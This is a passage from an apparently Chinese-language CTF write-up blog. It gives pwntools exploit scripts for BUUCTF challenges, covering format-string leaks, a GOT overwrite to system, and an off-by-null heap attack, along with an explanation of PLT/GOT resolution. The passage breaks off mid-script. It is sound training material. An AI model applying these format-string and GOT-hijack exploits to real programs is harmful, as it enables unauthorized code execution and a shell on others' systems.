class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line">#  -*- coding: utf<span class="number">-8</span> -*-</span><br><span class="line"><span class="meta"># from LibcSearcher import LibcSearcheronline</span></span><br><span class="line">from pwn import *</span><br><span class="line">import binascii</span><br><span class="line"></span><br><span class="line">it = lambda: io.interactive()</span><br><span class="line">ru = lambda x: io.recvuntil(x)</span><br><span class="line">rud = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">rl = lambda: io.recvline()</span><br><span class="line">rld = lambda: io.recvline(keepends=False)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line"></span><br><span class="line">elf_path = <span class="string">&quot;./wustctf2020_babyfmt&quot;</span></span><br><span class="line">elf = ELF(elf_path)</span><br><span class="line">context(arch=elf.arch, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;2.23&quot;</span> in libc.path:</span><br><span class="line">    one_gadget = [<span class="number">0x45216</span>, <span class="number">0x4526A</span>, <span class="number">0xF02A4</span>, <span class="number">0xF1147</span>]</span><br><span class="line">elif <span class="string">&quot;2.27&quot;</span> in libc.path:</span><br><span class="line">    one_gadget = [<span class="number">0x4F2C5</span>, <span class="number">0x4F322</span>, <span class="number">0x10A38C</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    one_gadget = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    remote_ip = <span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">    remote_port = <span class="number">28573</span></span><br><span class="line">    io = remote(remote_ip, remote_port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(elf_path)</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    gdbscript = <span class="string">&quot;&quot;</span><span class="string">&quot; </span></span><br><span class="line"><span class="string">    b *$rebase(0xECC)</span></span><br><span class="line"><span class="string">    b *$rebase(0xF43)</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line"></span><br><span class="line"># &lt;=<span class="number">4096</span> 无洞</span><br><span class="line">def add(name: bytes, sex: bytes, content: bytes):</span><br><span class="line">    sa(b<span class="string">&quot;ption---&gt;&gt;\n&quot;</span>, b<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sa(b<span class="string">&quot;name\n&quot;</span>, name)</span><br><span class="line">    sa(b<span class="string">&quot;sex\n&quot;</span>, sex)</span><br><span class="line">    sa(b<span class="string">&quot;information\n&quot;</span>, content)</span><br><span class="line"></span><br><span class="line">def edit(index: <span class="type">int</span>, content: bytes):</span><br><span class="line">    sa(b<span class="string">&quot;ption---&gt;&gt;\n&quot;</span>, b<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sa(b<span class="string">&quot;index : \n&quot;</span>, str(index).encode())</span><br><span class="line">    sa(b<span class="string">&quot;change sex?\n&quot;</span>, b<span class="string">&quot;n&quot;</span>)</span><br><span class="line">    sa(b<span class="string">&quot;information\n&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"># 没有清空</span><br><span class="line">def <span class="built_in">free</span>(index: <span class="type">int</span>):</span><br><span class="line">    sa(b<span class="string">&quot;ption---&gt;&gt;\n&quot;</span>, b<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sa(b<span class="string">&quot;index : \n&quot;</span>, str(index).encode())</span><br><span class="line"></span><br><span class="line">def show(index: <span class="type">int</span>):</span><br><span class="line">    sa(b<span class="string">&quot;choice : \n&quot;</span>, b<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sa(b<span class="string">&quot;index : \n&quot;</span>, str(index).encode())</span><br><span class="line"></span><br><span class="line">def convert_str_asmencode(content: str):</span><br><span class="line">    out = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i in content:</span><br><span class="line">        out = hex(ord(i))[<span class="number">2</span>:] + out</span><br><span class="line">    out = <span class="string">&quot;0x&quot;</span> + out</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line">sla(b<span class="string">&quot;time:&quot;</span>, b<span class="string">&quot;1 2 3&quot;</span>)</span><br><span class="line">sla(b<span class="string">&quot;&gt;&gt;&quot;</span>, b<span class="string">&quot;2&quot;</span>)</span><br><span class="line">s(b<span class="string">&quot;%7$n%18$p%3$p&quot;</span>)</span><br><span class="line">secret_addr = <span class="type">int</span>(r(<span class="number">14</span>), <span class="number">16</span>) - <span class="number">0x55DF49801050</span> + <span class="number">0x55DF49A02060</span></span><br><span class="line">stdout_fileno = <span class="type">int</span>(r(<span class="number">14</span>), <span class="number">16</span>) - <span class="number">0x7F5DA2FED260</span> + <span class="number">0x7F5DA32BB690</span></span><br><span class="line"></span><br><span class="line">sla(b<span class="string">&quot;&gt;&gt;&quot;</span>, b<span class="string">&quot;2&quot;</span>)</span><br><span class="line">payload = b<span class="string">&quot;%2c%10$n%11$s&quot;</span>.ljust(<span class="number">0x10</span>, b<span class="string">&quot;a&quot;</span>) + p64(stdout_fileno) + p64(secret_addr)</span><br><span class="line">s(payload)</span><br><span class="line">r(<span class="number">2</span>)</span><br><span class="line">secret = r(<span class="number">0x40</span>)</span><br><span class="line">sla(b<span class="string">&quot;&gt;&gt;&quot;</span>, b<span class="string">&quot;3&quot;</span>)</span><br><span class="line">sla(b<span class="string">&quot;door!\n&quot;</span>, secret)</span><br><span class="line"><span class="meta"># ru(b<span class="string">&quot;\x55&quot;</span>)</span></span><br><span class="line"><span class="meta"># print(r(0x40))</span></span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<h3 id="bbctf-2020-fmt-me"><a href="#bbctf-2020-fmt-me" class="headerlink" title="bbctf_2020_fmt_me"></a>bbctf_2020_fmt_me</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#bbctf_2020_fmt_me">BUUCTF在线评测</a></p>
<p>这个题目用的snprintf,其实和printf一样，参数位置也都是从栈上来的，只不过后把结果输出到目标 buff，并不影响</p>
<p>这个题目关键也是劫持控制流，由于system的参数是readonly,所以也不好修改，只能把system_got改成main函数，那么第二次把atoi改成system_plt+6,如果还是改成system_got那么就会回到main,而system_plt+6会重新解析地址，不会受现有的got干扰</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sla(b<span class="string">&quot;Choice: &quot;</span>, b<span class="string">&quot;2&quot;</span>)</span><br><span class="line">atoi_got = elf.got[<span class="string">&quot;atoi&quot;</span>]</span><br><span class="line">system_plt = elf.plt[<span class="string">&quot;system&quot;</span>] + <span class="number">6</span></span><br><span class="line">system_got = elf.got[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">&quot;main&quot;</span>]</span><br><span class="line">offset = <span class="number">6</span></span><br><span class="line">sa(</span><br><span class="line">    b<span class="string">&quot;ou a gift.\n&quot;</span>,</span><br><span class="line">    fmtstr_payload(offset, &#123;system_got: main_addr, atoi_got: system_plt&#125;),</span><br><span class="line">)</span><br><span class="line">sl(b<span class="string">&quot;/bin/sh\0&quot;</span>)</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<p>这个题目本来说来难度不大，但当时有点脑残了，导致进入了误区，同时snprintf在pwn里面也不常见，我搜出来的都是php的，所以就想分享一下</p>
<h4 id="报错"><a href="#报错" class="headerlink" title="报错"></a>报错</h4><p>有时候%9$n报错的原因要看看到底能不能写，最开始我想写rodata但一致报错，忘记不可以写了</p>
<h4 id="snprintf"><a href="#snprintf" class="headerlink" title="snprintf"></a>snprintf</h4><p>snprintf,sprintf,printf,这些其实大同小异，n就是多了一个长度的限制，你只能有n个长度的fomrat_string，s的区别可以理解成他把printf的结果从stdout重定向到了指定的buf里面，但是printf的效果和对应的offset还是一摸一样的</p>
<h4 id="1-p"><a href="#1-p" class="headerlink" title="%1$p"></a>%1$p</h4><p>rcx的值<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843229928-b7524233-e0f9-4f2b-9c49-f63ee2948ed5.png#averageHue=%23492221&clientId=u9d5fd636-f51f-4&from=paste&id=u6c9796cc&originHeight=42&originWidth=335&originalType=url&ratio=1&rotation=0&showTitle=false&size=7419&status=done&style=none&taskId=u1229cfcb-2c28-4876-bef0-cefa1bc1e44&title=" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843229925-0998b49a-a501-4ba2-8855-cddc463749e1.png#averageHue=%232a2625&clientId=u9d5fd636-f51f-4&from=paste&id=u59f25b92&originHeight=50&originWidth=473&originalType=url&ratio=1&rotation=0&showTitle=false&size=10911&status=done&style=none&taskId=u0eabb88c-c68f-4975-9512-03fbe4ede20&title=" alt="image.png"><br>我们之前printf的时候是字符串，所以在buff里面也是以字符串形式保存的，而不是直接保存对应的hex值</p>
<h4 id="2-p"><a href="#2-p" class="headerlink" title="%2$p"></a>%2$p</h4><p>R8的值<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843229917-0d29e109-4551-49b4-9997-061dd86ec544.png#averageHue=%23252524&clientId=u9d5fd636-f51f-4&from=paste&id=u89d0ba4f&originHeight=19&originWidth=153&originalType=url&ratio=1&rotation=0&showTitle=false&size=1987&status=done&style=none&taskId=u27560fa8-133a-4271-97bd-b2d1f788480&title=" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843229630-04a85073-c351-4c56-987f-50b7df63fb9b.png#averageHue=%232c2626&clientId=u9d5fd636-f51f-4&from=paste&id=uef8ebd4e&originHeight=48&originWidth=355&originalType=url&ratio=1&rotation=0&showTitle=false&size=9103&status=done&style=none&taskId=u07316108-c687-4c70-a77b-1edbfaed6a0&title=" alt="image.png"></p>
<h4 id="3-p"><a href="#3-p" class="headerlink" title="%3$p"></a>%3$p</h4><h4 id="4-p"><a href="#4-p" class="headerlink" title="%4$p"></a>%4$p</h4><p>调用之前栈上的第一个值<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843229966-2bacaa29-3aa8-4184-b7b9-e1023284be34.png#averageHue=%23272525&clientId=u9d5fd636-f51f-4&from=paste&id=u90616403&originHeight=561&originWidth=1032&originalType=url&ratio=1&rotation=0&showTitle=false&size=142275&status=done&style=none&taskId=udcc685ba-84ec-469d-8c46-2deafff1737&title=" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843230586-a26cf121-551d-4670-8b51-f9689c4b7b20.png#averageHue=%232c2626&clientId=u9d5fd636-f51f-4&from=paste&id=u948c54d6&originHeight=48&originWidth=378&originalType=url&ratio=1&rotation=0&showTitle=false&size=9379&status=done&style=none&taskId=u5bd899f3-dd53-4310-a424-dfe24f74f9b&title=" alt="image.png"></p>
<h4 id="5-p"><a href="#5-p" class="headerlink" title="%5$p"></a>%5$p</h4><p>调用之前栈上的第二个值<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843230652-715fe1ee-02a5-4c59-aa9e-d5d9aec734e2.png#averageHue=%23272525&clientId=u9d5fd636-f51f-4&from=paste&id=u1e9b5f1e&originHeight=575&originWidth=936&originalType=url&ratio=1&rotation=0&showTitle=false&size=145864&status=done&style=none&taskId=u221804cb-5f7e-426b-a618-cd579a0358f&title=" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843230769-96bab3ea-b955-49d1-b7aa-e1623e4b20a8.png#averageHue=%232a2625&clientId=u9d5fd636-f51f-4&from=paste&id=u43dc1611&originHeight=51&originWidth=422&originalType=url&ratio=1&rotation=0&showTitle=false&size=9308&status=done&style=none&taskId=ufa530c89-3647-419d-a961-6f93efe6a57&title=" alt="image.png"></p>
<h4 id="got-plt表原理"><a href="#got-plt表原理" class="headerlink" title="got,plt表原理"></a>got,plt表原理</h4><p>这两个是ctf里面比较常用的结构 这是plt本身的样子，我们可以利用右键unhide<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843230909-24a5deba-80ac-4b69-b703-2129f5880fbf.png#averageHue=%23faf7f2&clientId=u9d5fd636-f51f-4&from=paste&id=u27371976&originHeight=324&originWidth=1049&originalType=url&ratio=1&rotation=0&showTitle=false&size=42817&status=done&style=none&taskId=uef3b4989-7060-423b-93c7-d4ee91eb8d1&title=" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843231144-2eda3b0d-d8fb-411b-b679-605188729ec1.png#averageHue=%23fbf9f7&clientId=u9d5fd636-f51f-4&from=paste&id=uecba2793&originHeight=195&originWidth=795&originalType=url&ratio=1&rotation=0&showTitle=false&size=16022&status=done&style=none&taskId=u18ea7f71-71bf-4e98-9f2c-edad05078ba&title=" alt="image.png"><br>注意这里有这样的结构，plt本身是一个jmp指令,跳转的位置就是我们的got表里面保存的地址，这个地址会在第一次访问的时候被修改成对应的libc地址<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843231320-2421f680-4bb8-442d-89d3-446e60ef1d04.png#averageHue=%23f9f8f6&clientId=u9d5fd636-f51f-4&from=paste&id=u38ff5c19&originHeight=210&originWidth=930&originalType=url&ratio=1&rotation=0&showTitle=false&size=38923&status=done&style=none&taskId=uc9174609-20cb-4b34-b7b7-db9e631a8a5&title=" alt="image.png"><br>+6偏移的是一个push num,num代表这个函数在plt的序号，以及另一个跳转<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843231431-f8f3b487-c884-4ed0-9c05-92bdf3b9ca9f.png#averageHue=%23f5f5f4&clientId=u9d5fd636-f51f-4&from=paste&id=u7fadaa9c&originHeight=92&originWidth=405&originalType=url&ratio=1&rotation=0&showTitle=false&size=5349&status=done&style=none&taskId=u705cf72e-bf40-4370-83f6-70223b3e418&title=" alt="image.png"><br>这个时候看起来是0,我们看看具体是怎么回事<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843232110-f82b8559-9555-47c3-a6e3-3bddb857d7f9.png#averageHue=%23f5f4f3&clientId=u9d5fd636-f51f-4&from=paste&id=u2353423e&originHeight=60&originWidth=742&originalType=url&ratio=1&rotation=0&showTitle=false&size=9396&status=done&style=none&taskId=udb5c4607-d59a-4a4d-ae4d-583cd34d6fe&title=" alt="image.png"></p>
<h4 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h4><p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843232253-70c9af15-42ae-4b3b-900c-0eb4810f6072.png#averageHue=%23fdfdfd&clientId=u9d5fd636-f51f-4&from=paste&id=u18bb5202&originHeight=400&originWidth=677&originalType=url&ratio=1&rotation=0&showTitle=false&size=31929&status=done&style=none&taskId=u1ed9423b-0605-4853-a568-c38fb8bea10&title=" alt="image.png"><br>我们就用题目的system来测试<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843232346-5e12bfb2-ec6e-4114-bbc4-aa8569485f0f.png#averageHue=%23272525&clientId=u9d5fd636-f51f-4&from=paste&id=u074eb71f&originHeight=66&originWidth=853&originalType=url&ratio=1&rotation=0&showTitle=false&size=21363&status=done&style=none&taskId=ud33e7c61-c230-43e8-953d-aab103232b1&title=" alt="image.png"><br>rdi为对应的参数地址，可以看到它call的是system@plt 这个时候先push一个返回地址，然后跳转到system@plt.然后跳转到<a href="mailto:&#x73;&#x79;&#115;&#x74;&#x65;&#109;&#64;&#103;&#111;&#116;&#x2e;&#x70;&#108;&#x74;">&#x73;&#x79;&#115;&#x74;&#x65;&#109;&#64;&#103;&#111;&#116;&#x2e;&#x70;&#108;&#x74;</a>对应的地址<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843232789-3ed0e87e-687c-415c-b803-b4abb1dfba77.png#averageHue=%23262525&clientId=u9d5fd636-f51f-4&from=paste&id=ub85ea4a1&originHeight=536&originWidth=968&originalType=url&ratio=1&rotation=0&showTitle=false&size=128563&status=done&style=none&taskId=u9c9cea42-6bcd-45da-a547-05aeb136ab4&title=" alt="image.png"><br>这个时候因为是第一次调用，可以看到system@got的地址是我们system@plt下一条指令也就是+6位置的值，那么我们就相当于从call system-&gt;system@plt-&gt;system@plt+6<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843232838-3dbb7dbb-d9f7-43d8-954b-0f1851528dbb.png#averageHue=%23282624&clientId=u9d5fd636-f51f-4&from=paste&id=u74cceaf0&originHeight=116&originWidth=1131&originalType=url&ratio=1&rotation=0&showTitle=false&size=28811&status=done&style=none&taskId=uf6745bd2-97cc-449f-bd7d-0f484ffd817&title=" alt="image.png"><br>这里的2就是我们对应的编号，然后jmp过去，可以看到push了一个地址，这个地址之后可以用来计算got的地址，进而填写<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843233398-734475a6-d0af-4934-9760-c45dd4a4c3d8.png#averageHue=%23272525&clientId=u9d5fd636-f51f-4&from=paste&id=u051f7345&originHeight=62&originWidth=1302&originalType=url&ratio=1&rotation=0&showTitle=false&size=23765&status=done&style=none&taskId=u82edd337-7034-4cf1-a212-186d434e140&title=" alt="image.png"><br>这里jmp的地址就是我们上图看到的第二个0，这个在运行之前会被填写成_dl_runtime_resolve_xsavec的地址<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843233496-38d06267-ac27-4fe4-9f2a-490e3ed9f61d.png#averageHue=%23252524&clientId=u9d5fd636-f51f-4&from=paste&id=u058d4877&originHeight=132&originWidth=896&originalType=url&ratio=1&rotation=0&showTitle=false&size=29070&status=done&style=none&taskId=u03393f98-217c-467b-b5d9-68550d111f9&title=" alt="image.png"><br>中间会调用_dl_fixup,传入的第一个参数是got里面第一个0运行后填写的值，我也不太知道这个值有什么用，第二个就是编号<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843233387-f6adfb1b-4b27-4b56-bd7c-0cd19a08debd.png#averageHue=%23252524&clientId=u9d5fd636-f51f-4&from=paste&id=u9fa36c1c&originHeight=30&originWidth=228&originalType=url&ratio=1&rotation=0&showTitle=false&size=3519&status=done&style=none&taskId=uae782d12-5ccd-4f02-acea-f7a15e9778c&title=" alt="image.png"><br>这个函数会把对应got的值修改并返回对应的的地址<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843233896-1205f753-f5f0-49eb-b9d1-6e4101561f3b.png#averageHue=%232c2525&clientId=u9d5fd636-f51f-4&from=paste&id=u0805c3aa&originHeight=33&originWidth=538&originalType=url&ratio=1&rotation=0&showTitle=false&size=8289&status=done&style=none&taskId=ua470b98a-94ef-49f6-b9ad-11e3f85a09f&title=" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843234486-503f2311-508b-4582-9986-4b6742470010.png#averageHue=%232f2724&clientId=u9d5fd636-f51f-4&from=paste&id=ue03c1647&originHeight=29&originWidth=847&originalType=url&ratio=1&rotation=0&showTitle=false&size=13037&status=done&style=none&taskId=u90018884-ba15-465a-bb1d-ec639addd8f&title=" alt="image.png"><br>最最后，我们会跳转到真正要执行的函数去完成功能<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843234531-360fa461-bec3-46a3-ac3d-aa56962743f4.png#averageHue=%23282625&clientId=u9d5fd636-f51f-4&from=paste&id=u8193275a&originHeight=380&originWidth=1202&originalType=url&ratio=1&rotation=0&showTitle=false&size=137984&status=done&style=none&taskId=u9db0f354-0896-4731-b1e5-6f0d73497db&title=" alt="image.png"><br>我们可以看到，plt+6处的指令其实也可以有相对应的功能，只不过就是过程复杂一点，这个可以用在当got表被污染的时候，我们通过plt去执行不了，但是可以通过plt+6来执行，这个原理可以用在这个题目</p>
<h1 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h1><h2 id="off-by-null"><a href="#off-by-null" class="headerlink" title="off by null"></a>off by null</h2><h3 id="asis2016-b00ks"><a href="#asis2016-b00ks" class="headerlink" title="asis2016_b00ks"></a>asis2016_b00ks</h3><p>这个题目漏洞还行，一个off by null,可以修改bss的堆地址，但是这个题目free不太好free edit也不太好edit</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line">#  -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">it = lambda: io.interactive()</span><br><span class="line">ru = lambda x: io.recvuntil(x)</span><br><span class="line">rud = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">rl = lambda: io.recvline()</span><br><span class="line">rld = lambda: io.recvline(keepends=False)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf_path = &quot;./b00ks&quot;</span><br><span class="line">lib_path=&quot;&quot;</span><br><span class="line">#lib_path=&quot;/home/zhou/glibc-all-in-one/libs/2.27-3ubuntu1_amd64&quot;</span><br><span class="line">parm=elf_path</span><br><span class="line">#parm=[elf_path,&quot;127.0.0.1&quot;,&quot;3339&quot;]</span><br><span class="line">elf = ELF(elf_path)</span><br><span class="line">context(arch=elf.arch, log_level=&quot;debug&quot;)</span><br><span class="line">if lib_path:</span><br><span class="line">    libc = ELF(f&quot;&#123;lib_path&#125;/libc.so.6&quot;)</span><br><span class="line">else:</span><br><span class="line">    libc=elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if len(sys.argv) &gt; 1:</span><br><span class="line">    remote_ip = &quot;node4.buuoj.cn&quot;</span><br><span class="line">    remote_port = 28190</span><br><span class="line">    io = remote(remote_ip, remote_port)</span><br><span class="line">else:</span><br><span class="line">    if lib_path:</span><br><span class="line">        io = process(parm,env= &#123;&#x27;LD_LIBRARY_PATH&#x27;: lib_path&#125;)</span><br><span class="line">    else:</span><br><span class="line">        io = process(parm)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    global io</span><br><span class="line">    gdbscript = &quot;&quot;&quot;</span><br><span class="line">    b </span><br><span class="line">    c</span><br><span class="line">    x/20xg $rebase(0x202010)</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def debug_force():</span><br><span class="line">    global io</span><br><span class="line">    io.close()</span><br><span class="line">    gdbscript = &quot;&quot;&quot;</span><br><span class="line">    b *$rebase(0xF2B)</span><br><span class="line">    c</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    if lib_path:</span><br><span class="line">        io=gdb.debug(parm,env= &#123;&#x27;LD_LIBRARY_PATH&#x27;: lib_path&#125;, gdbscript=gdbscript)</span><br><span class="line">    else:</span><br><span class="line">        io=gdb.debug(parm, gdbscript=gdbscript)</span><br><span class="line"></span><br><span class="line">#0x1000</span><br><span class="line">def add(size,name,size2,des):</span><br><span class="line">    sla(b&quot;&gt; &quot;,b&quot;1&quot;)</span><br><span class="line">    sla(b&quot;Enter book name size: &quot;,str(size))</span><br><span class="line">    sla(b&quot;Enter book name (Max 32 chars): &quot;,name)</span><br><span class="line">    sla(b&quot;\nEnter book description size: &quot;,str(size2))</span><br><span class="line">    sla(b&quot;Enter book description:&quot;,des)</span><br><span class="line"></span><br><span class="line">def free(idx):</span><br><span class="line">    sla(b&quot;&gt; &quot;,b&quot;2&quot;)</span><br><span class="line">    sla(b&quot;Enter the book id you want to delete: &quot;,str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def show():</span><br><span class="line">    sla(b&quot;&gt; &quot;,b&quot;4&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def edit(idx,content):</span><br><span class="line">    sla(b&quot;&gt; &quot;,b&quot;3&quot;)</span><br><span class="line">    sla(b&quot;Enter the book id you want to edit: &quot;,str(idx))</span><br><span class="line">    sa(b&quot;Enter new book description: &quot;,content)</span><br><span class="line"></span><br><span class="line">def changeName(name):</span><br><span class="line">    sla(b&quot;&gt; &quot;,b&#x27;5&#x27;)</span><br><span class="line">    sla(b&quot;Enter author name: &quot;,name)</span><br><span class="line"># def rol(val,k):</span><br><span class="line">#     s=bin(val)[2:]</span><br><span class="line">#     return int(s[k:]+s[:k],2)</span><br><span class="line"># def ror(val,k):</span><br><span class="line">#     s=bin(val)[2:]</span><br><span class="line">#     return int(s[-k:]+s[:len(s)-k],2)</span><br><span class="line"># def convert_str_asmencode(content: str):</span><br><span class="line">#     out = &quot;&quot;</span><br><span class="line">#     for i in content:</span><br><span class="line">#         out = hex(ord(i))[2:] + out</span><br><span class="line">#     out = &quot;0x&quot; + out</span><br><span class="line">#     return out</span><br><span class="line"></span><br><span class="line">#debug_force()</span><br><span class="line">sla(b&quot;Enter author name: &quot;,b&quot;a&quot;*32)</span><br><span class="line">add(0x18,b&quot;1&quot;,0x18,b&quot;1&quot;)</span><br><span class="line">add(0x68,b&quot;2&quot;,0x88,b&quot;2&quot;)</span><br><span class="line">add(0x18,b&quot;3&quot;,0x18,b&quot;3&quot;)</span><br><span class="line">add(0x18,b&quot;/bin/sh\0&quot;,0x18,b&quot;/bin/sh\0&quot;)</span><br><span class="line">add(0x58,b&quot;5&quot;,0x58,b&quot;5&quot;)</span><br><span class="line">free(1)</span><br><span class="line">free(3)</span><br><span class="line">free(2)</span><br><span class="line">add(0x18,b&quot;0&quot;,0x18,b&quot;1&quot;)</span><br><span class="line">add(0x88,p64(1)+p64(0),0x18,b&quot;c&quot;)</span><br><span class="line">changeName(b&quot;a&quot;*32)</span><br><span class="line">free(1)</span><br><span class="line">show()</span><br><span class="line">ru(b&quot;Name: &quot;)</span><br><span 